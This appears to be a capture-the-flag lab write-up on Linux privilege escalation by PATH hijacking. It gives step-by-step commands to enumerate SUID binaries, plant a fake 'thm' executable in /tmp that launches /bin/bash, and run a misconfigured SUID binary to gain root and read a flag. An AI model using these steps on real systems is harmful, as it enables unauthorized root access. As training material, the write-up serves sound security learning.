# PATH Privilege Escalation

## Step 1: User & Permission Enumeration

First, check the current user's sudo permissions and directory information.

```bash
whoami
id
sudo -l
ls -la
```

## Step 2: PATH Enumeration & Hijacking

Since sudo access is unavailable, inspect the current PATH environment variable.

```bash
echo $PATH
```

**Hint:** PATH determines where Linux searches for executable commands. If a SUID program calls another command without using its absolute path, a modified PATH may allow command hijacking.

Add `/tmp` to the beginning of PATH:

```bash
export PATH=/tmp:$PATH
```

Create a fake executable named `thm`:

```bash
cd /tmp
echo "/bin/bash" > thm
chmod 777 thm
ls -l thm
```

## Step 3: Identify & Execute SUID Binary

Search for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

Inspect the discovered binary:

```bash
ls -l /home/murdoch/test
file /home/murdoch/test
```

Execute the SUID binary:

```bash
/home/murdoch/test
```

Check privileges:

```bash
id
```

## Step 4: Find the Flag

Search for the flag file:

```bash
find / -name "flag6.txt" 2>/dev/null
```

Read the flag:

```bash
cat /path/to/flag6.txt
```

## Technique

- **Category:** Linux Privilege Escalation
- **Method:** PATH Hijacking
- **Related Vulnerability:** SUID Binary Misconfiguration
- **Target Binary:** `/home/murdoch/test`
- **Result:** Root Access
